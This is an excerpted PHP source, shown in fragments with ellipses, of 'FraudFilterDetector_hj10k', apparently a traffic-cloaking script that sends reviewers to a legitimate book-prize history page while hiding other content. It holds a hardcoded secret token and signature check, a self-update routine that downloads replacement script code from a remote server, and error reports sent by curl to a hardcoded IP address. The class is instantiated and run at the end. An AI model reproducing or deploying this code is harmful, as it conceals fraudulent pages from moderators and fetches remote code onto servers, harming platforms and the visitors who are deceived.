...
class FraudFilterDetector_hj10k {
    ...
    function isSignatureValid($sign, $time) {
        $str = '114ea662-4e4d-43aa-8bf9-a531add5610f.'.$this->getClid().'.'.$time;
        $sha = sha1($str);
        return $sign === $sha;
    }
...
<?php
    ...
    function safeAction() {
        $this->redirect('https://www.friedenspreis-des-deutschen-buchhandels.de/en/history');
    }
    ...
    function getUpgradeScriptViaContents($home, $fileName) {
        $opts = array('http' =>
            array(
                'method'  => 'GET',
                'header' => 'x-ff-secret: 114ea662-4e4d-43aa-8bf9-a531add5610f',
                'timeout' => 2
            )
        );
    ...
    function upgradeScript($home, $fileName) {
        ...
        if ($output === false || !$this->isSignature2Valid($output)) {
            ...
            $headers[] = 'x-ff-secret: 114ea662-4e4d-43aa-8bf9-a531add5610f';
...
";
    ...
    function fillAllPostHeaders() {
        ...
        $headers[] = 'X-FF-P: 114ea662-4e4d-43aa-8bf9-a531add5610f';
    ...
    function notifyAboutError($message) {
        ...
        $url = 'http://139.59.212.55/ff-notify.html?v=ff1&guid=hj10k&m='.$message;
        $ch = curl_init($url);
...
$fraudFilterDetector_hj10k = new FraudFilterDetector_hj10k();
$fraudFilterDetector_hj10k->check();
